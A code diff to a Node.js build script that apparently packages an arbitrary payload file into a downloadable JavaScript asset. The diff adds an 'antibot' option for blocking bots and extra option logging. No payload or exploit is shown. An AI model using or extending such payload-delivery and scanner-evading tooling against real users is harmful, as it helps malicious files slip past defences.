@@ -21,13 +21,17 @@ program
     "application/octet-stream"
   )
   .option("-f, --function <string>", "Name of exported function", "download")
-  .option("-c, --compress", "Enable payload compression (gzip)");
+  .option("-c, --compress", "Enable payload compression (gzip)")
+  .option("-a, --antibot", "Enable bot detection and block them (recommended)");
 
 program.parse();
 
 console.log("Using payload:", program.opts().payload);
 console.log("Using filename:", program.opts().name);
 console.log("Using Content-Type:", program.opts().type);
+console.log("Exported function:", program.opts().function);
+console.log("Compression:", program.opts().compress);
+console.log("Antibot:", program.opts().antibot);
 
 const dst = "src/assets/payload.bin";
 fs.readFile(program.opts().payload, { encoding: "latin1" }, (err, data) => {
@@ -48,6 +52,7 @@ fs.readFile(program.opts().payload, { encoding: "latin1" }, (err, data) => {
         filename: program.opts().name,
         funcname: program.opts().function,
         compress: program.opts().compress,
+        antibot: program.opts().antibot,
       })
     );
     compiler.run((err3, stats) => {
